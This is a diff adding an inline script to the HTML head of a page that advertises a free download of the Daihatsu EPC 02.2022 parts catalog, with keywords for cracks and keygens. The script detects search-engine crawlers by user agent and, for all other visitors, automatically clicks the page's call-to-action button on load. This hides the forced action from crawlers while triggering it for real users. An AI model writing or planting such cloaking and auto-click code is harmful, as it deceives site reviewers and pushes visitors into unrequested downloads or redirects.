@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Daihatsu EPC 02.2022</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Download Daihatsu EPC 02.2022 spare parts catalog for LHD and RHD models in various languages, compatible with Windows 7, 10, and 11.">
     <meta name="keywords" content="Daihatsu EPC 2022, Daihatsu EPC February 2022, Daihatsu EPC 02.2022, Daihatsu EPC free download, Daihatsu EPC 2022 free download, Daihatsu Electronic Parts Catalog, Daihatsu parts catalog 2022, Daihatsu parts download, Daihatsu spare parts 2022, Daihatsu parts by VIN, Daihatsu parts by model, LHD Daihatsu parts, RHD Daihatsu parts, Daihatsu European market parts, Daihatsu General market parts, Daihatsu Australian market parts, Daihatsu parts search, Daihatsu VIN decoding, VIN search Daihatsu, Daihatsu part number search, Daihatsu PNC search, Daihatsu Part Group FIG, free download Daihatsu EPC, Daihatsu EPC crack, Daihatsu EPC keygen, Daihatsu spare parts catalog, Daihatsu parts catalog PDF, catalogue free download Daihatsu, Daihatsu EPC 2022 descargar, каталог запчастей Daihatsu, каталог запчастей Daihatsu бесплатно, Daihatsu EPC каталог запчастей, Daihatsu EPC каталог запчастей 2022, каталог запчастей Daihatsu 2022, каталог запчастей Daihatsu бесплатно 2022, каталог запчастей Daihatsu скачать, каталог запчастей Daihatsu скачать бесплатно, каталог запчастей Daihatsu скачать 2022, каталог запчастей Daihatsu скачать бесплатно 2022, каталог запчастей Daihatsu PNC, каталог запчастей Daihatsu VIN, каталог запчастей Daihatsu под VIN, качаем ассортимент запчастей Daihatsu, каталог запчастей Daihatsu VIN номера, каталог запчастей Daihatsu PNC поиск, каталог запчастей Daihatsu FIG">
     <style>
